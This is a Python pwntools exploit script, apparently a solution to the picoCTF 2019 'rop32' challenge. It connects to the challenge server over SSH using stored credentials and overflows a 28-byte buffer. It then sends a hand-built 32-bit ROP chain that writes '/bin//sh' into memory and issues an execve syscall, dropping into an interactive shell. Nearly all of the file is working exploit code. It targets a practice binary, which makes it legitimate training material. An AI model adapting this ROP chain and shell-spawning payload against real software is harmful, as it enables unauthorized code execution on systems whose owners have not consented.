from pwn import *
import json
from struct import pack

LOCAL = False
CYCLIC_FOUND = True
elf = ELF('./vuln')

local_bin = "./vuln"

if(LOCAL):
    pr = process(local_bin)
else:
    hostname = "2019shell1.picoctf.com"
    dir = '/problems/rop32_6_7bd1329b26cbc416c56374c320e354e9'
    with open("/.2019creds.json") as f:
        creds = json.load(f)
        print(creds["user"],creds["pass"])
    s = ssh(host=hostname,user=creds["user"],password=creds["pass"])
    s.set_working_directory(dir)
    pr = s.process('sh')
    pr.sendline('./vuln')

# found offset at 28
if(not CYCLIC_FOUND):
    payload = cyclic(100)
    print(pr.recvline().decode())
    pr.sendline(payload)
    print(pr.recvall().decode())

#add_flag = elf.symbols['flag']
'''
Need to write /bin/sh into buffer then call system on it
'''
offset = "A"*28
payload = offset

p = ''

p += pack('<I', 0x0806ee6b) # pop edx ; ret
p += pack('<I', 0x080da060) # @ .data
p += pack('<I', 0x080a8e36) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ee6b) # pop edx ; ret
p += pack('<I', 0x080da064) # @ .data + 4
p += pack('<I', 0x080a8e36) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ee6b) # pop edx ; ret
p += pack('<I', 0x080da068) # @ .data + 8
p += pack('<I', 0x08056420) # xor eax, eax ; ret
p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080da060) # @ .data
p += pack('<I', 0x0806ee92) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080da068) # @ .data + 8
p += pack('<I', 0x080da060) # padding without overwrite ebx
p += pack('<I', 0x0806ee6b) # pop edx ; ret
p += pack('<I', 0x080da068) # @ .data + 8
p += pack('<I', 0x08056420) # xor eax, eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x08049563) # int 0x80
payload += p
print pr.recvline()
pr.sendline(payload)
pr.interactive()
#print pr.recv()

'''
payload += p32(add_flag)

print p.recvline()
p.sendline(payload)
print p.recv()
'''
